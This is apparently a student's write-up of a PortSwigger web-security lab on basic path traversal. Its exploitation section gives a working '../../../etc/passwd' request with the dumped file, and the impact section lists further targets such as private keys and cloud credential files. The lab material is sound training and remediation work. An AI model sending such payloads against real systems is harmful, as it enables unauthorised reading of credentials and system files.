# File path traversal, simple case

**Category:** Path traversal
**Level:** Apprentice
**Mechanism:** Basic traversal (../)
**Lab URL:** https://portswigger.net/web-security/file-path-traversal/lab-simple

---

## Vulnerability

Path traversal (a.k.a. directory traversal) lets an attacker read files outside the
intended directory by injecting `../` sequences into a filename the application uses to
build a filesystem path. Here the product-image endpoint passes a user-controlled
`filename` straight to a file read with no sanitisation, so the path can be walked up to
the filesystem root and back down to any readable file.

## Reconnaissance

The product pages load images through `GET /image?filename=<name>` (e.g.
`filename=34.jpg`). A parameter that names a file on the server is the classic path
traversal sink, so the first thing to test is whether `../` is honoured instead of being
stripped or normalised away.

## Exploitation

Intercepted an image request in Burp and replaced the `filename` value with
`../../../etc/passwd`. Three `../` are enough to reach `/` from the image directory;
any excess is harmless because you cannot traverse above the root.

Request:

```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: 0a73003f031a829681bfd9b2003100d0.web-security-academy.net
Cookie: session=48JY1Tqua2SACWOatZaG6SzBZNCARkvt
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Dest: image
Referer: https://0a73003f031a829681bfd9b2003100d0.web-security-academy.net/
```

Response — the server returns the file contents under an `image/jpeg` content type,
confirming it read an arbitrary file off disk:

```http
HTTP/2 200 OK
Content-Type: image/jpeg
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
...
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
```

Lab solved — `/etc/passwd` retrieved.

## Impact

Arbitrary file read with the privileges of the web process. `/etc/passwd` enumerates
local accounts (here: `peter`, `carlos`, `user`), which seeds username lists for
brute-force and credential attacks. The same primitive reads anything the process can
open — application source and config, framework secrets, `/proc/self/environ`,
private keys, cloud credential files — so a "just an image endpoint" bug is a direct
path to information disclosure and often to a deeper foothold.

## Remediation

- Prefer not to pass user input into a filesystem path at all — map an opaque ID to a
  known file server-side, or store and serve images from object storage by key.
- If a filename must be used, validate after canonicalisation: resolve the full path
  (e.g. `realpath`) and confirm it is still inside the intended base directory; reject
  anything that escapes it.
- Allowlist the expected characters/extension rather than blacklisting `../`; blacklists
  fall to encoding and non-recursive-stripping tricks (covered in later labs).

## References

- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

## Notes

- `image/jpeg` content type on a text file is a tell: the handler sets the type from the
  requested extension/endpoint, not the real content — a sign it is blindly streaming
  whatever path it is given.
- Session cookie left in the evidence because it is a disposable lab session; in a real
  engagement scrub session tokens and other secrets from the report.